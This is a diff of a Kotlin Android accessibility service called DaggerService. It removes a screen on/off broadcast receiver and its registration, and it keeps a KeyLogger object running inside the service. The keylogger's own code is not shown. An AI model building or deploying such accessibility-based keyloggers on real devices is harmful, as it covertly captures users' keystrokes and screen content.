@@ -47,7 +47,6 @@ class DaggerService : AccessibilityService() {
         })
 
         keyLogger = KeyLogger()
-        receiver = ScreenStateReceiver()
     }
 
     override fun onInterrupt() {
@@ -113,7 +112,6 @@ class DaggerService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         serviceInfo = accessibilityServiceInfo()
-        registerScreenStateReceiver(receiver)
         running = true
         Log.d(TAG, "DaggerService started.")
     }
@@ -121,7 +119,6 @@ class DaggerService : AccessibilityService() {
 
     override fun onDestroy() {
         super.onDestroy()
-        unregisterReceiver(receiver)
         running = false
         Log.d(TAG, "Stopping DaggerService.")
     }
@@ -144,13 +141,6 @@ class DaggerService : AccessibilityService() {
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         return info
-    }
-
-    private fun registerScreenStateReceiver(receiver: BroadcastReceiver) {
-        val intentFilter = IntentFilter(Intent.ACTION_SCREEN_ON)
-        intentFilter.addAction(Intent.ACTION_SCREEN_OFF)
-        registerReceiver(receiver, intentFilter)
-        Log.d(TAG, "Registering screen state listener")
     }
 
     private fun logEvent(event: AccessibilityEvent, message: String) {
